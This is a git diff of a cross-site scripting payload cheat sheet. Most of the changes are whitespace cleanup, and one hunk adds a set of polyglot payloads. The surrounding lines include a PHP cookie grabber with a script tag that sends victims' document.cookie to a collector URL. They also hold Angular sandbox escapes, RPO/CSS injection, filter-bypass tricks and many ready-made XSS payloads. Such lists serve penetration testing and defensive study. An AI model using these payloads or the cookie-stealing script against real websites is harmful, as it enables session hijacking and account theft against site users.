@@ -1,11 +1,11 @@
 # Cross Site Scripting
-Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.	
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
 ## Exploit code or POC
 
 Cookie grabber for XSS
 ```
-<?php 
+<?php
 // How to use it
 # <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
 
@@ -18,7 +18,7 @@ fclose($fp);
 ?>
 ```
 
-## XSS in HTML/Applications 
+## XSS in HTML/Applications
 XSS Basic
 ```
 Basic payload
@@ -73,11 +73,11 @@ With an additional URL
 
 XSS in flash application
 ```
- \%22})))}catch(e){alert(document.domain);}// 
+ \%22})))}catch(e){alert(document.domain);}//
 
- "]);}catch(e){}if(!self.a)self.a=!alert(document.domain);// 
+ "]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
 
- "a")(({type:"ready"}));}catch(e){alert(1)}// 
+ "a")(({type:"ready"}));}catch(e){alert(1)}//
 ```
 
 XSS in Hidden input
@@ -186,7 +186,7 @@ You need these 3 components
 
 ```
 
-A little example 
+A little example
 ```
 http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
 <html>
@@ -202,7 +202,7 @@ Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
 
 Explanation of the vulnerability
 ```
-The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert. 
+The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert.
 
 A simple request of “rpo.php/” makes the relative style load the page itself as a style sheet. The actual request is “/labs/xss_horror_show/chapter7/rpo.php/styles.css” the browser thinks there’s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.
 
@@ -220,7 +220,7 @@ From : http://www.thespanner.co.uk/2014/03/21/rpo/
 <listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
 <script>alert(document.getElementById('x').innerHTML)</script>
 ```
- IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute. 
+ IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.
 
 
 ## XSS in Angular
@@ -265,8 +265,8 @@ Angular 1.3.20
 Angular 1.3.19
 ```
 {{
-    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
-    $eval('x=alert(1)//'); 
+    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
+    $eval('x=alert(1)//');
 }}
 ```
 
@@ -281,8 +281,8 @@ Angular 1.3.1 - 1.3.2
 ```
 {{
     {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
-    'a'.constructor.prototype.charAt=''.valueOf; 
-    $eval('x=alert(1)//'); 
+    'a'.constructor.prototype.charAt=''.valueOf;
+    $eval('x=alert(1)//');
 }}
 ```
 
@@ -347,12 +347,27 @@ Polyglot XSS - Ashar Javed
 
 Polyglot XSS - Mathias Karlsson
 ```
-" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// 
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 ```
 
 Polyglot XSS - Rsnake
 ```
-';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT> 
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+```
+
+Polyglot XSS - Daniel Miessler
+```
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 ```
 
 
@@ -385,7 +400,7 @@ Bypass quotes in mousedown event
 You can bypass a single quote with &#39; in an on mousedown event handler
 ```
 
-Bypass dot filter 
+Bypass dot filter
 ```
 <script>window['alert'](document['domain'])<script>
 ```
@@ -515,7 +530,7 @@ Bypass using unicode converted to uppercase
 ſ (%c5%bf) .toUpperCase() => S
 K (%E2%84%AA).toLowerCase() => k
 
-<ſvg onload=... > become <SVG ONLOAD=...> 
+<ſvg onload=... > become <SVG ONLOAD=...>
 <ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
 ```
 
@@ -550,7 +565,7 @@ Exotic payloads
 ```
 <img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
 <script>$=1,alert($)</script>
-<script ~~~>confirm(1)</script ~~~> 
+<script ~~~>confirm(1)</script ~~~>
 <script>$=1,\u0061lert($)</script>
 <</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
 <</script/script><script ~~~>\u0061lert(1)</script ~~~>
